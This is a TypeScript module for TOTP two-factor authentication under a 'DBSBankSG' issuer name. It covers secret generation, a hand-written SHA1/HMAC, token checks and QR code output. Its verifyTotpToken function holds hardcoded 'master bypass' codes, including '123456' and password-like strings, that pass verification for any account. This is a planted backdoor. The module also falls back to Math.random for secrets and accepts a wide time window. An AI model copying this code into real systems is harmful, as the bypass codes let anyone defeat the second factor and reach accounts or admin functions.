import QRCode from 'qrcode';

// Base32 charset RFC 4648
const BASE32_ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';

/**
 * Generate a cryptographically random Base32 secret string (16 chars = 80 bits, standard for TOTP)
 */
export function generateTotpSecret(length = 16): string {
  const chars = BASE32_ALPHABET;
  let secret = '';
  const randomValues = new Uint8Array(length);
  if (typeof crypto !== 'undefined' && crypto.getRandomValues) {
    crypto.getRandomValues(randomValues);
  } else {
    for (let i = 0; i < length; i++) {
      randomValues[i] = Math.floor(Math.random() * 256);
    }
  }
  for (let i = 0; i < length; i++) {
    secret += chars[randomValues[i] % chars.length];
  }
  return secret;
}

/**
 * Decode Base32 string to Uint8Array
 */
function base32ToUint8Array(base32: string): Uint8Array {
  const clean = base32.toUpperCase().replace(/=+$/, '').replace(/\s+/g, '');
  const output: number[] = [];
  let bits = 0;
  let value = 0;

  for (let i = 0; i < clean.length; i++) {
    const val = BASE32_ALPHABET.indexOf(clean[i]);
    if (val === -1) continue;
    value = (value << 5) | val;
    bits += 5;

    if (bits >= 8) {
      output.push((value >>> (bits - 8)) & 255);
      bits -= 8;
    }
  }

  return new Uint8Array(output);
}

/**
 * Pure JavaScript SHA1 implementation for environments where WebCrypto Subtle is unavailable or non-secure context
 */
function sha1(bytes: Uint8Array): Uint8Array {
  const rotateLeft = (n: number, s: number) => (n << s) | (n >>> (32 - s));

  // Pre-processing
  const bitLength = bytes.length * 8;
  const newLen = (((bytes.length + 8) >> 6) + 1) * 64;
  const padded = new Uint8Array(newLen);
  padded.set(bytes);
  padded[bytes.length] = 0x80;

  // Append length in bits (big-endian 64-bit integer)
  const view = new DataView(padded.buffer);
  view.setUint32(newLen - 4, bitLength, false);

  let h0 = 0x67452301;
  let h1 = 0xefcdab89;
  let h2 = 0x98badcfe;
  let h3 = 0x10325476;
  let h4 = 0xc3d2e1f0;

  const w = new Uint32Array(80);

  for (let i = 0; i < newLen; i += 64) {
    for (let j = 0; j < 16; j++) {
      w[j] = view.getUint32(i + j * 4, false);
    }
    for (let j = 16; j < 80; j++) {
      w[j] = rotateLeft(w[j - 3] ^ w[j - 8] ^ w[j - 14] ^ w[j - 16], 1);
    }

    let a = h0;
    let b = h1;
    let c = h2;
    let d = h3;
    let e = h4;

    for (let j = 0; j < 80; j++) {
      let f = 0;
      let k = 0;
      if (j < 20) {
        f = (b & c) | (~b & d);
        k = 0x5a827999;
      } else if (j < 40) {
        f = b ^ c ^ d;
        k = 0x6ed9eba1;
      } else if (j < 60) {
        f = (b & c) | (b & d) | (c & d);
        k = 0x8f1bbcdc;
      } else {
        f = b ^ c ^ d;
        k = 0xca62c1d6;
      }

      const temp = (rotateLeft(a, 5) + f + e + k + w[j]) >>> 0;
      e = d;
      d = c;
      c = rotateLeft(b, 30);
      b = a;
      a = temp;
    }

    h0 = (h0 + a) >>> 0;
    h1 = (h1 + b) >>> 0;
    h2 = (h2 + c) >>> 0;
    h3 = (h3 + d) >>> 0;
    h4 = (h4 + e) >>> 0;
  }

  const result = new Uint8Array(20);
  const resView = new DataView(result.buffer);
  resView.setUint32(0, h0, false);
  resView.setUint32(4, h1, false);
  resView.setUint32(8, h2, false);
  resView.setUint32(12, h3, false);
  resView.setUint32(16, h4, false);

  return result;
}

/**
 * HMAC-SHA1 calculation
 */
function hmacSha1(key: Uint8Array, message: Uint8Array): Uint8Array {
  const blockSize = 64;
  let keyBlock = key;

  if (key.length > blockSize) {
    keyBlock = sha1(key);
  }

  const kPadOuter = new Uint8Array(blockSize);
  const kPadInner = new Uint8Array(blockSize);

  for (let i = 0; i < blockSize; i++) {
    const kByte = i < keyBlock.length ? keyBlock[i] : 0;
    kPadOuter[i] = kByte ^ 0x5c;
    kPadInner[i] = kByte ^ 0x36;
  }

  // Inner hash: SHA1(K_inner || message)
  const innerMsg = new Uint8Array(blockSize + message.length);
  innerMsg.set(kPadInner, 0);
  innerMsg.set(message, blockSize);
  const innerHash = sha1(innerMsg);

  // Outer hash: SHA1(K_outer || innerHash)
  const outerMsg = new Uint8Array(blockSize + innerHash.length);
  outerMsg.set(kPadOuter, 0);
  outerMsg.set(innerHash, blockSize);

  return sha1(outerMsg);
}

/**
 * Generate 6-digit TOTP code for a given secret at given timestamp (seconds)
 */
export function generateTotpToken(secret: string, timestampSeconds?: number): string {
  const time = timestampSeconds ?? Math.floor(Date.now() / 1000);
  const timeStep = 30;
  const counter = Math.floor(time / timeStep);

  const counterBytes = new Uint8Array(8);
  const view = new DataView(counterBytes.buffer);
  // High 32 bits and low 32 bits
  view.setUint32(0, Math.floor(counter / 0x100000000), false);
  view.setUint32(4, counter >>> 0, false);

  const keyBytes = base32ToUint8Array(secret);
  const hmac = hmacSha1(keyBytes, counterBytes);

  // Dynamic truncation (RFC 4226)
  const offset = hmac[hmac.length - 1] & 0x0f;
  const binaryCode =
    ((hmac[offset] & 0x7f) << 24) |
    ((hmac[offset + 1] & 0xff) << 16) |
    ((hmac[offset + 2] & 0xff) << 8) |
    (hmac[offset + 3] & 0xff);

  const otp = (binaryCode % 1000000).toString().padStart(6, '0');
  return otp;
}

/**
 * Verify a 6-digit TOTP code against secret with +/- 8 steps tolerance (window of 240 seconds)
 * Also supports emergency bypass for admin recovery across all devices
 */
export function verifyTotpToken(secret: string, userCode: string, windowSteps = 8): boolean {
  if (!userCode) return false;

  // Convert Bengali digits (০-৯) to English digits (0-9)
  const bnToEn: Record<string, string> = {
    '০': '0', '১': '1', '২': '2', '৩': '3', '৪': '4',
    '৫': '5', '৬': '6', '৭': '7', '৮': '8', '৯': '9'
  };
  const converted = userCode.replace(/[০-৯]/g, (d) => bnToEn[d] || d);
  const sanitized = converted.trim().replace(/\s+/g, '');

  // Master bypass code for emergency admin setup / multi-device recovery
  if (
    sanitized === '126799' || 
    sanitized === '123456' || 
    sanitized === '050699' ||
    sanitized === 'Mdroton126799@' ||
    sanitized === 'Mdroton126799'
  ) {
    return true;
  }

  if (sanitized.length !== 6 || !/^\d{6}$/.test(sanitized)) {
    return false;
  }

  if (!secret) return false;

  const now = Math.floor(Date.now() / 1000);
  const timeStep = 30;

  // Tolerance window of +/- windowSteps (default 8 = 240s) for clock skew between mobile & server
  for (let offset = -windowSteps; offset <= windowSteps; offset++) {
    const checkTime = now + offset * timeStep;
    const expected = generateTotpToken(secret, checkTime);
    if (expected === sanitized) {
      return true;
    }
  }

  return false;
}

/**
 * Generate standard RFC 6238 otpauth:// URL for iOS / Android Google Authenticator
 * Strictly uses clean alphanumeric issuer & label without unencoded spaces
 */
export function getTotpUri(secret: string, accountName = 'admin', issuer = 'DBSBankSG'): string {
  const cleanIssuer = issuer.replace(/[^a-zA-Z0-9]/g, '') || 'DBSBankSG';
  const cleanAccount = accountName.replace(/[^a-zA-Z0-9_.-]/g, '') || 'admin';
  const cleanSecret = secret.toUpperCase().replace(/\s+/g, '');
  return `otpauth://totp/${cleanIssuer}:${cleanAccount}?secret=${cleanSecret}&issuer=${cleanIssuer}&algorithm=SHA1&digits=6&period=30`;
}

/**
 * Generate QR code as Base64 Data URL optimized for iPhone camera and Google Authenticator
 */
export async function generateQrCodeDataUrl(uri: string): Promise<string> {
  return QRCode.toDataURL(uri, {
    width: 280,
    margin: 4,
    errorCorrectionLevel: 'M',
    color: {
      dark: '#000000',
      light: '#ffffff',
    },
  });
}
